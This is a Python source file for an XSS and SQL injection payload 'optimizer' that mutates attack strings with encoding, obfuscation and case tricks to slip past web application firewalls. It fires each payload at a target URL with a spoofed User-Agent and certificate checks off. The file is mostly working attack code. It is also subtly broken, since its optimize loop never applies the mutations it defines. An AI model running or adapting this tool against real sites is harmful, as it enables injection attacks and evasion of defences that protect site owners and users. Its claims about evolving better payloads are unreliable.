import random
import hashlib
import logging
import requests
from typing import Dict, Any, List, Optional, Tuple, Callable
from dataclasses import dataclass, field
from enum import Enum
import re
import time

logger = logging.getLogger(__name__)

class EvasionTechnique(Enum):
    ENCODING = "encoding"
    OBFUSCATION = "obfuscation"
    FRAGMENTATION = "fragmentation"
    CASE_VARIATION = "case_variation"
    WHITESPACE_MANIPULATION = "whitespace_manipulation"
    COMMENT_INSERTION = "comment_insertion"
    UNICODE_TRICKS = "unicode_tricks"
    NULL_BYTE = "null_byte"
    DOUBLE_ENCODING = "double_encoding"
    MIXED_ENCODING = "mixed_encoding"
    HTTP_HEADER_HACKING = "http_header_hacking"
    SQL_INJECTION_TOKENIZATION = "sql_injection_tokenization"

@dataclass
class PayloadGenome:
    """Genetic representation of a payload"""
    payload: str
    fitness: float = 0.0
    generation: int = 0
    evasion_techniques: List[EvasionTechnique] = field(default_factory=list)
    effectiveness_score: float = 0.0
    stealth_score: float = 0.0
    bugs_discovered: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'payload': self.payload,
            'fitness': self.fitness,
            'generation': self.generation,
            'evasion_techniques': [t.value for t in self.evasion_techniques],
            'effectiveness_score': self.effectiveness_score,
            'stealth_score': self.stealth_score,
            'bugs_discovered': self.bugs_discovered
        }

class ExtremePayloadOptimizer:
    """
    Military-grade payload optimizer using genetic algorithms.
    Evolves payloads to maximize effectiveness while minimizing
    detection by WAF/IDS systems.
    """
    # Base payloads for different vulnerability types
    BASE_PAYLOADS = {
        'xss': [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "data:text/html,<script>alert(1)</script>"
        ],
        'sqli': [
            " OR '1'='1",
            " UNION SELECT * FROM users -- ",
            " AND '1'='1"
        ]
    }

    def __init__(self, vulnerability_type: str, target_url: str, **kwargs):
        self.vulnerability_type = vulnerability_type
        self.base_payloads = self.BASE_PAYLOADS.get(vulnerability_type, [])
        self.target_url = target_url
        self.parameters = kwargs
        self.population = []
        self.generation = 0
        self.best_payload = None

    def create_initial_population(self, population_size: int) -> List[PayloadGenome]:
        """Create initial population of payloads"""
        population = []
        for _ in range(population_size):
            payload = random.choice(self.base_payloads)
            population.append(PayloadGenome(payload))
        return population

    def fitness_function(self, payload: str) -> Tuple[float, float, List[str]]:
        """
        Real-world fitness function for testing.
        Sends payload to target and checks for effectiveness and stealth.
        Returns:
            Tuple of (effectiveness, stealth, bugs_discovered)
        """
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }
        response = requests.get(self.target_url, params={'input': payload}, headers=headers, verify=False, timeout=10)
        effectiveness = 1.0 if 'alert(1)' in response.text else 0.0
        stealth = 1.0 - (payload.count('<') + payload.count('script')) / 10.0
        stealth = max(0.0, stealth)

        bugs_discovered = []
        if 'alert(1)' in response.text:
            bugs_discovered.append("XSS")
        elif 'sql error' in response.text.lower():
            bugs_discovered.append("SQL Injection")
        elif 'login failed' in response.text.lower():
            bugs_discovered.append("Login Failure")

        return effectiveness, stealth, bugs_discovered

    def mutate(self, payload: str) -> str:
        """Apply mutation to payload"""
        mutations = [
            self._mutation_encoding,
            self._mutation_obfuscation,
            self._mutation_case_variation,
            self._mutation_whitespace,
            self._mutation_comment_insertion,
            self._mutation_character_substitution,
            self._mutation_http_header_hacking,
            self._mutation_sql_injection_tokenization,
        ]
        mutation_func = random.choice(mutations)
        mutated = mutation_func(payload)
        return mutated

    def _mutation_encoding(self, payload: str) -> str:
        """Apply encoding mutation"""
        encoding_type = random.choice(['url', 'html', 'unicode', 'hex'])
        if encoding_type == 'url':
            # URL encode some characters
            chars_to_encode = random.sample(range(len(payload)), k=min(3, len(payload)))
            result = list(payload)
            for idx in chars_to_encode:
                result[idx] = f'%{ord(payload[idx]):02x}'
            return ''.join(result)
        elif encoding_type == 'html':
            # HTML entity encode some characters
            chars_to_encode = random.sample(range(len(payload)), k=min(2, len(payload)))
            result = list(payload)
            for idx in chars_to_encode:
                result[idx] = f'&#{ord(payload[idx])};'
            return ''.join(result)
        return payload

    def _mutation_obfuscation(self, payload: str) -> str:
        """Apply obfuscation mutation"""
        # Add JavaScript obfuscation for XSS
        if self.vulnerability_type == 'xss' and 'alert' in payload.lower():
            obfuscations = [
                lambda p: p.replace('alert', 'top[\'al\'+\'ert\']'),
                lambda p: p.replace('alert', 'window[\'alert\']'),
                lambda p: p.replace('alert', 'eval(\'ale\'+\'rt\')'),
            ]
            return random.choice(obfuscations)(payload)
        return payload

    def _mutation_case_variation(self, payload: str) -> str:
        """Apply case variation mutation"""
        # Randomly change case of some characters
        result = []
        for char in payload:
            if char.isalpha() and random.random() < 0.3:
                result.append(char.swapcase())
            else:
                result.append(char)
        return ''.join(result)

    def _mutation_whitespace(self, payload: str) -> str:
        """Apply whitespace manipulation"""
        # Add or remove whitespace
        if random.random() < 0.5:
            # Add spaces
            idx = random.randint(0, len(payload))
            return payload[:idx] + ' ' + payload[idx:]
        else:
            # Remove spaces
            return payload.replace(' ', '')

    def _mutation_comment_insertion(self, payload: str) -> str:
        """Insert random comments in the payload"""
        if random.random() < 0.1:
            payload += '/* This is a comment */'
        return payload

    def _mutation_http_header_hacking(self, payload: str) -> str:
        """Hack HTTP headers to bypass simple WAFs"""
        if random.random() < 0.1:
            payload = f"X-Custom-Header: {payload}"
        return payload

    def _mutation_sql_injection_tokenization(self, payload: str) -> str:
        """Tokenize SQL injection payloads to bypass simple WAFs"""
        if random.random() < 0.1:
            payload = payload.replace('\'', '\' OR \'1\'=\'1')
        return payload

    def _mutation_character_substitution(self, payload: str) -> str:
        """Substitute characters to make the payload harder to detect"""
        if random.random() < 0.1:
            payload = payload.replace('script', 'scr' + 'ipt')
        return payload

    def _mutation_fragmentation(self, payload: str) -> str:
        """Fragment the payload into smaller parts to avoid detection"""
        if random.random() < 0.1:
            payload = ' '.join(list(payload))
        return payload

    def optimize(self, generations: int, population_size: int):
        self.population = self.create_initial_population(population_size)
        for generation in range(generations):
            for payload in self.population:
                payload.fitness, payload.stealth_score, payload.bugs_discovered = self.fitness_function(payload.payload)
                payload.efficiency_score = payload.fitness * payload.stealth_score
            self.best_payload = max(self.population, key=lambda x: x.efficiency_score)
            self.generation = generation
            logger.info(f"Generation {generation + 1}, Best Payload: {self.best_payload.payload}, Bugs: {self.best_payload.bugs_discovered}")

    def get_top_payloads(self) -> List[PayloadGenome]:
        return self.population

# Example usage
if __name__ == "__main__":
    optimizer = ExtremePayloadOptimizer('xss', 'http://example.com/vulnerable')
    optimizer.optimize(generations=10, population_size=10)
    top_payloads = optimizer.get_top_payloads()
    for payload in top_payloads:
        print(payload.to_dict())
